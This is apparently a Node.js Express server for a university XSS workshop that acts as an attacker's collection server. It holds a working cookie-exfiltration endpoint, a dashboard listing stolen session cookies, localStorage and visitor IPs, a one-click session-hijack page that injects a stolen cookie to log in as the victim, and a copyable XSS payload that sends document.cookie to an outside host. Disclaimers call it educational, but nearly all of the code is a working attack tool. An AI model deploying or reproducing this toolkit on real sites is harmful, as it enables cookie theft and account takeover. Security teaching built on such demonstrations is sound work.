const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 4000;  // Different port from vulnerable app

// Store exfiltrated data in memory (for educational purposes)
const exfiltratedData = [];

app.use(express.json({ limit: '10mb' }));

// ===== EXFILTRATION ENDPOINT =====
// This simulates data collection for educational demonstration

app.get('/exfil', (req, res) => {
  const timestamp = new Date().toISOString();
  const data = {
    timestamp,
    method: 'GET',
    query: req.query,
    headers: {
      'user-agent': req.headers['user-agent'],
      'referer': req.headers['referer'],
      'origin': req.headers['origin']
    },
    ip: req.ip
  };
  
  exfiltratedData.push(data);
  
  // Log to console
  console.log('\n🚨 DATA RECEIVED (GET):');
  console.log('Time:', timestamp);
  console.log('Data:', req.query);
  console.log('Referer:', req.headers['referer']);
  
  // Log to file
  fs.appendFileSync('exfiltration.log', 
    `\n[${timestamp}] GET - ${JSON.stringify(data, null, 2)}\n` + 
    '='.repeat(80) + '\n'
  );
  
  // Return 1x1 transparent pixel (so the img tag doesn't show broken image)
  res.set('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

app.post('/exfil', (req, res) => {
  const timestamp = new Date().toISOString();
  const data = {
    timestamp,
    method: 'POST',
    body: req.body,
    headers: {
      'user-agent': req.headers['user-agent'],
      'referer': req.headers['referer'],
      'origin': req.headers['origin']
    },
    ip: req.ip
  };
  
  exfiltratedData.push(data);
  
  // Log to console with colors
  console.log('\n🚨 DATA RECEIVED (POST):');
  console.log('Time:', timestamp);
  console.log('Cookie:', req.body.cookie);
  console.log('LocalStorage:', req.body.localStorage);
  console.log('URL:', req.body.url);
  console.log('Referer:', req.headers['referer']);
  
  // Log to file
  fs.appendFileSync('exfiltration.log', 
    `\n[${timestamp}] POST - ${JSON.stringify(data, null, 2)}\n` + 
    '='.repeat(80) + '\n'
  );
  
  res.json({ success: true, message: 'Data received' });
});

// ===== DASHBOARD ENDPOINT =====
// Shows all stolen data in a web interface

app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>� XSS Demonstration Dashboard</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { 
      background: #1a1a1a; 
      color: #ffffff; 
      font-family: 'Courier New', monospace;
    }
    .container { max-width: 1200px; }
    .card { 
      background: #2a2a2a; 
      border: 1px solid #00ff00;
      margin-bottom: 1rem;
    }
    .card-header { 
      background: #000; 
      color: #00ff00;
      border-bottom: 1px solid #00ff00;
    }
    .stolen-item {
      background: #1a1a1a;
      border: 1px solid #00ff00;
      padding: 1rem;
      margin-bottom: 1rem;
      border-radius: 5px;
    }
    .timestamp { color: #ffaa00; }
    .method-get { color: #00aaff; }
    .method-post { color: #ff00ff; }
    .cookie { color: #ff5555; }
    .url { color: #55ff55; }
    pre { 
      background: #000; 
      color: #ffffff; 
      padding: 1rem; 
      border-radius: 5px;
      overflow-x: auto;
    }
    .skull { font-size: 3rem; }
    .blink {
      animation: blink 1s infinite;
    }
    @keyframes blink {
      0%, 50%, 100% { opacity: 1; }
      25%, 75% { opacity: 0; }
    }
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 1rem;
      margin-bottom: 2rem;
    }
    .stat-card {
      background: #000;
      border: 2px solid #00ff00;
      padding: 1.5rem;
      text-align: center;
      border-radius: 5px;
    }
    .stat-number {
      font-size: 2.5rem;
      font-weight: bold;
      color: #ff0000;
    }
    .stat-label {
      color: #00ff00;
      font-size: 0.9rem;
    }
    .payload-container {
      position: relative;
      margin-bottom: 1rem;
    }
    .copy-btn {
      position: absolute;
      top: 0.5rem;
      right: 0.5rem;
      padding: 0.25rem 0.5rem;
      font-size: 0.75rem;
      background: #00ff00;
      color: #000;
      border: none;
      border-radius: 3px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
    }
    .copy-btn:hover {
      background: #00cc00;
    }
    .copy-btn.copied {
      background: #ff00ff;
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="container py-4">
    
    <!-- Educational Disclaimer -->
    <div class="alert alert-warning border-warning mb-4" style="background: #2a2a00; color: #ffff00;">
      <h5 class="alert-heading">⚠️ EDUCATIONAL PURPOSES ONLY</h5>
      <p class="mb-0">
        <strong>IMPORTANT DISCLAIMER:</strong> This dashboard is part of a cybersecurity education workshop. 
        It demonstrates how XSS (Cross-Site Scripting) vulnerabilities can be exploited. 
        The techniques shown here are for <strong>educational purposes only</strong> and must never be used on systems 
        without explicit authorization. Unauthorized access to computer systems is illegal and unethical.
      </p>
    </div>
    
    <div class="text-center mb-4">
      <div class="skull">🎓</div>
      <h1>XSS DEMONSTRATION DASHBOARD</h1>
      <p class="text-warning">Educational Data Collection Server</p>
      <p class="text-white small">Running on: https://project-1-17.eduhk.hk</p>
    </div>

    <!-- Stats -->
    <div class="stats">
      <div class="stat-card">
        <div class="stat-number" id="totalCount">${exfiltratedData.length}</div>
        <div class="stat-label">TOTAL REQUESTS</div>
      </div>
      <div class="stat-card">
        <div class="stat-number" id="cookieCount">${exfiltratedData.filter(d => d.query?.data || d.body?.cookie).length}</div>
        <div class="stat-label">COOKIES RECEIVED</div>
      </div>
    </div>

    <!-- Exfiltrated Data Display -->
    <div class="card">
      <div class="card-header">
        <div class="d-flex justify-content-between align-items-center">
          <strong>📡 EXFILTRATED DATA (${exfiltratedData.length} entries)</strong>
          <button class="btn btn-sm btn-outline-danger" onclick="clearData()">🗑️ Clear All</button>
        </div>
      </div>
      <div class="card-body" id="dataContainer">
        ${exfiltratedData.length === 0 ? 
          '<p class="text-center text-white">No data captured yet. Waiting for demonstration...</p>' :
          exfiltratedData.slice().reverse().map((item, index) => `
            <div class="stolen-item">
              <div class="d-flex justify-content-between mb-2">
                <strong class="timestamp">⏰ ${item.timestamp}</strong>
                <span class="badge ${item.method === 'POST' ? 'method-post bg-primary' : 'method-get bg-info'}">${item.method}</span>
              </div>
              
              ${item.body?.cookie || item.query?.data ? `
                <div class="mb-2">
                  <strong class="cookie">🍪 SESSION COOKIE:</strong>
                  <pre class="mb-1" id="cookie-${exfiltratedData.length - index - 1}">${item.body?.cookie || item.query?.data}</pre>
                  <div class="mt-2">
                    <button class="btn btn-sm btn-success" onclick="copyCookie(${exfiltratedData.length - index - 1})">
                      📋 Copy Cookie
                    </button>
                    <button class="btn btn-sm btn-danger" onclick="hijackSession(${exfiltratedData.length - index - 1})">
                      🎯 Hijack Session (Auto-Login)
                    </button>
                  </div>
                </div>
              ` : ''}
              
              ${item.body?.localStorage ? `
                <div class="mb-2">
                  <strong class="text-warning">💾 LOCAL STORAGE:</strong>
                  <pre class="mb-1">${item.body.localStorage}</pre>
                </div>
              ` : ''}
              
              ${item.body?.url && !item.body?.cookie ? `
                <div class="mb-2">
                  <strong class="url">🔗 SOURCE URL:</strong>
                  <pre class="mb-1">${item.body.url}</pre>
                </div>
              ` : ''}
              
              ${Object.keys(item.query || {}).length > 0 ? `
                <div class="mb-2">
                  <strong class="text-info">📋 QUERY PARAMS:</strong>
                  <pre class="mb-1">${JSON.stringify(item.query, null, 2)}</pre>
                </div>
              ` : ''}
              
              <div class="small text-white">
                <strong>🌐 Referer:</strong> ${item.headers.referer || 'N/A'}<br>
                <strong>🖥️ User-Agent:</strong> ${item.headers['user-agent'] || 'N/A'}<br>
                <strong>📍 IP:</strong> ${item.ip}
              </div>
            </div>
          `).join('')
        }
      </div>
    </div>

    <!-- Instructions -->
    <div class="card mt-4">
      <div class="card-header">
        <strong>📚 HOW TO USE THIS DEMONSTRATION</strong>
      </div>
      <div class="card-body text-white">
        <ol class="text-white">
          <li>Use the example XSS payloads below in the vulnerable chatbot's comment board</li>
          <li>Post the payload to demonstrate the vulnerability</li>
          <li>When users view the page, their session data appears here automatically</li>
          <li>This page auto-refreshes every 3 seconds to show new data</li>
        </ol>
        
        <div class="mt-3">
          <strong style="color: #ffaa00;">🎯 Example XSS Payload (click to copy):</strong>
          
          <div class="payload-container">
            <button class="copy-btn" onclick="copyPayload(this, 0)">📋 COPY</button>
            <pre id="payload-0">&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil?data='+document.cookie)"&gt;</pre>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Copy payload to clipboard
    function copyPayload(button, payloadId) {
      const pre = document.getElementById('payload-' + payloadId);
      const text = pre.textContent;
      
      navigator.clipboard.writeText(text).then(() => {
        button.textContent = '✅ COPIED!';
        button.classList.add('copied');
        
        setTimeout(() => {
          button.textContent = '📋 COPY';
          button.classList.remove('copied');
        }, 2000);
      }).catch(err => {
        console.error('Failed to copy:', err);
        alert('Failed to copy. Please copy manually.');
      });
    }
    
    // Copy stolen cookie to clipboard
    function copyCookie(index) {
      const cookieElement = document.getElementById('cookie-' + index);
      if (!cookieElement) {
        alert('❌ Cookie not found!');
        return;
      }
      
      const cookieText = cookieElement.textContent.trim();
      
      navigator.clipboard.writeText(cookieText).then(() => {
        alert('✅ Cookie copied to clipboard!\\n\\nNow you can:\\n1. Open http://localhost:3000 in a new incognito window\\n2. Open DevTools (F12) → Console\\n3. Paste and run this command:\\n\\ndocument.cookie = "' + cookieText.substring(0, 50) + '..."; location.reload();');
      }).catch(err => {
        console.error('Failed to copy:', err);
        alert('❌ Failed to copy. Please copy manually.');
      });
    }
    
    // Hijack session - automatically inject cookie and redirect
    function hijackSession(index) {
      const cookieElement = document.getElementById('cookie-' + index);
      if (!cookieElement) {
        alert('❌ Cookie not found!');
        return;
      }
      
      const cookieText = cookieElement.textContent.trim();
      
      // Extract connect.sid if it exists in the cookie string
      let sessionCookie = '';
      
      if (cookieText.includes('connect.sid=')) {
        const match = cookieText.match(/connect\\.sid=([^;]+)/);
        if (match) {
          sessionCookie = 'connect.sid=' + match[1];
        } else {
          sessionCookie = cookieText;
        }
      } else {
        sessionCookie = cookieText;
      }
      
      // Create a form that will POST to a hijack endpoint, then redirect
      // We'll use localStorage to pass the cookie, then open the target in new window
      const payload = {
        cookie: sessionCookie,
        timestamp: new Date().toISOString()
      };
      
      // Open the hijack helper page
      const hijackWindow = window.open('', '_blank');
      
      hijackWindow.document.write(\`
        <!DOCTYPE html>
        <html>
        <head>
          <title>🎯 Session Hijacker</title>
          <style>
            body {
              background: #000;
              color: #00ff00;
              font-family: 'Courier New', monospace;
              padding: 40px;
              text-align: center;
            }
            .container {
              max-width: 600px;
              margin: 0 auto;
              background: #1a1a1a;
              padding: 30px;
              border: 2px solid #00ff00;
              border-radius: 10px;
            }
            h1 { color: #ff0000; margin-bottom: 20px; }
            .step { 
              background: #000; 
              padding: 15px; 
              margin: 15px 0; 
              border-left: 4px solid #00ff00;
              text-align: left;
            }
            button {
              background: #ff0000;
              color: #fff;
              border: none;
              padding: 15px 30px;
              font-size: 1.2rem;
              border-radius: 5px;
              cursor: pointer;
              margin: 10px;
              font-family: 'Courier New', monospace;
              font-weight: bold;
            }
            button:hover {
              background: #cc0000;
            }
            pre {
              background: #000;
              padding: 10px;
              border-radius: 5px;
              text-align: left;
              overflow-x: auto;
              color: #ffaa00;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>🎯 SESSION HIJACK READY</h1>
            <p style="color: #ffaa00; font-size: 1.1rem;">Stolen Cookie Loaded!</p>
            
            <div class="step">
              <strong style="color: #ff0000;">Cookie to inject:</strong>
              <pre id="cookieDisplay">\${sessionCookie.substring(0, 80)}...</pre>
            </div>
            
            <div class="step">
              <strong style="color: #00ff00;">Choose your method:</strong>
            </div>
            
            <button onclick="autoHijack()">
              🚀 AUTO HIJACK<br>
              <small style="font-size: 0.7rem;">(Inject & Login Automatically)</small>
            </button>
            
            <button onclick="manualInstructions()" style="background: #0066ff;">
              📋 MANUAL INSTRUCTIONS<br>
              <small style="font-size: 0.7rem;">(Copy & Paste Method)</small>
            </button>
            
            <div id="instructions" style="display: none; margin-top: 20px;">
              <div class="step">
                <strong>Manual Method:</strong><br>
                1. Copy this command:<br>
                <pre id="command">document.cookie = "\${sessionCookie}; path=/"; location.href = "http://localhost:3000";</pre>
                <button onclick="copyCommand()" style="padding: 5px 15px; font-size: 0.9rem;">📋 Copy Command</button>
                <br><br>
                2. Open <a href="http://localhost:3000" target="_blank" style="color: #00ff00;">http://localhost:3000</a> in incognito<br>
                3. Press F12 → Console → Paste the command → Enter<br>
                4. You're logged in! 🎯
              </div>
            </div>
          </div>
          
          <script>
            const sessionCookie = \`\${sessionCookie}\`;
            
            function autoHijack() {
              // Set the cookie
              document.cookie = sessionCookie + "; path=/";
              
              // Show success message
              alert('✅ Cookie injected!\\n\\nRedirecting to vulnerable app...');
              
              // Redirect to the vulnerable app
              window.location.href = 'http://localhost:3000';
            }
            
            function manualInstructions() {
              document.getElementById('instructions').style.display = 'block';
            }
            
            function copyCommand() {
              const command = document.getElementById('command').textContent;
              navigator.clipboard.writeText(command).then(() => {
                alert('✅ Command copied!\\n\\nNow:\\n1. Open http://localhost:3000 (incognito)\\n2. F12 → Console\\n3. Paste & Enter');
              });
            }
          </script>
        </body>
        </html>
      \`);
    }
    
    // Auto-refresh every 3 seconds
    setInterval(() => {
      location.reload();
    }, 3000);
    
    function clearData() {
      if (confirm('Clear all data?')) {
        fetch('/clear', { method: 'POST' })
          .then(() => location.reload());
      }
    }
  </script>
</body>
</html>
  `);
});

// Clear all data endpoint
app.post('/clear', (req, res) => {
  exfiltratedData.length = 0;
  console.log('\n🗑️ All demonstration data cleared');
  res.json({ success: true });
});

// Get data as JSON (for API access)
app.get('/api/stolen', (req, res) => {
  res.json({ count: exfiltratedData.length, data: exfiltratedData });
});

app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║    �  XSS DEMONSTRATION SERVER - EDUCATIONAL USE ONLY  �     ║
║                                                                ║
║   Dashboard: https://project-1-17.eduhk.hk                    ║
║   Exfil Endpoint: https://project-1-17.eduhk.hk/exfil        ║
║   API: https://project-1-17.eduhk.hk/api/stolen              ║
║                                                                ║
║   📝 Logs saved to: exfiltration.log                          ║
║                                                                ║
║   ⚠️  EDUCATIONAL DEMO - This demonstrates XSS impact for      ║
║   cybersecurity education. Never use these techniques on       ║
║   systems without explicit authorization!                      ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝

🎯 Update your XSS payloads to use:
   https://project-1-17.eduhk.hk/exfil

📊 View demonstration dashboard:
   https://project-1-17.eduhk.hk

🔄 Dashboard auto-refreshes every 3 seconds
  `);
});

module.exports = app;
